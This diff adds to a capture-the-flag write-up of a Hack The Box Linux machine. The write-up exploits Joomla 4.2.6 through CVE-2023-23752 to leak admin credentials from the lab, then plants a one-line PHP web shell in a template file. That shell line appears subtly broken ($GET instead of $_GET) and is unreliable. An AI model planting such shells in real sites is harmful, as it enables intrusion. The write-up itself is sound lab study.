@@ -1,6 +1,6 @@
 {{date}} | {{time}}
 
-Tags: #linux #htb #easy 
+Tags: #linux #htb #easy #joomla #CVE-2023-23752 #php-webshell
 
 
 
@@ -57,4 +57,41 @@ The site isn't real interesting. Neither is a basic directory bust:
 A common tactic employed by CTF makers is to leverage virtual hosting. The scan is still running but we have something to check out while it finishes:
 
 ![](../../_attachments/Pasted%20image%2020240422122206.png)
+
+Directory busting on this virtually hosted subdomain reveals something interesting:
+
+![](../../_attachments/Pasted%20image%2020240422173524.png)
+
+This leads to a Joomla admin login page. Searching for a possible bypass, led to this blog post identifying a potentially sensitive file exposed to unauthenticated users:
+
+[CVE-2023-23752: Joomla Authentication Bypass Vulnerability (pingsafe.com)](https://www.pingsafe.com/blog/cve-2023-23752-joomla-authentication-bypass-vulnerability/)
+
+![](../../_attachments/Pasted%20image%2020240422174057.png)
+
+/administrator/manifests/files/joomla.xml
+
+The version is 4.2.6. It seems that Joomla 4.2.6 is vulnerable to CVE-2023-23752:
+
+[Joomla! CVE-2023-23752 to Code Execution - Blog - VulnCheck](https://vulncheck.com/blog/joomla-for-rce)
+
+Inspired by this blog post, the following request was made against the API (unauthenticated):
+
+![](../../_attachments/Pasted%20image%2020240422180750.png)
+
+`lewis`
+`P4ntherg0t1n5r3c0n##`
+
+Unfortunately, these credentials did not allow SSH access. It did, however, allow access to the admin portal.
+
+
+
+The admin portal allows content control, allowing the insertion of the following code into /templates/cassiopeia/index.php:
+
+``` php
+<?php if (isset($GET['cmd'])) system($_GET['cmd']); ?>
+```
+
+
+
+
 
